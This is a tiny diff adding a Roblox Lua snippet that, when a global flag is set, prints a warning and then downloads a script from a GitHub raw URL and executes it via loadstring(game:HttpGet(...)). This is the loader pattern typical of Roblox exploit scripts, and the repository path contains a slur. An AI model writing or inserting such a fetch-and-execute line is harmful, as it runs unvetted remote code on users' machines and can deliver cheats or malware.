@@ -1,0 +1,7 @@
+if _G.tb then
+warn("DONKEY")
+end
+
+if _G.tb then
+loadstring(game:HttpGet("https://raw.githubusercontent.com/shadywadd/derhood/refs/heads/main/GAYBOI"))()
+end
